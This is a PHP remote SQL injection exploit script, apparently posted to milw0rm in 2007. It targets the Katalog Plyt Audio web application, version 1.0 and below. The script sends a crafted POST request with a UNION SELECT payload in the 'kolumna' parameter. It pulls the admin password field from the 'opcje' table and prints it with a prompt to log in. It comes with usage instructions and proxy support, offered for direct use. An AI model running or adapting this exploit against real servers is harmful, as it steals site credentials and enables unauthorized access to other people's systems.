<?
/*
Author: Kacper
Contact: kacper1964@yahoo.pl
Homepage: http://www.rahim.webd.pl/
Irc: irc.milw0rm.com:6667 #devilteam 


Pozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.

Katalog Plyt Audio (pl) <= 1.0 Remote SQL Injection Exploit

script download: http://www.hotscripts.pl/produkt-3041.html
Script homepage/demo: http://cdaudio.ovh.org/
*/
if ($argc<3) {
print_r('
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
Usage: php '.$argv[0].' host path OPTIONS
host:       target server (ip/hostname)
path:       Katalog Plyt Audio path
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /kpa/ -P1.1.1.1:80
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
');
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}
$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";

if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
echo "Exploit...\n";
$packet ="POST ".$p."index.php?fraza=tak&kolumna=pozyczony%20union%20select%200,1,identyfikator,3,4,5,6,7,8,9,10,11,12,13,14/**/from/**/opcje/* HTTP/1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
sleep(4);
$temp=explode('<a href="album.php?id=0">',$html);
$temp2=explode('</a></td><td align=center>3',$temp[1]);
$sprawdz=trim($temp2[0]);
if (isset($sprawdz)) {
    
    die("\n\nYou Ident pass:".$sprawdz.", Now login to form_loguj.php");
    }

die("\n\nHack attempt :/");

?>

# milw0rm.com [2007-03-18]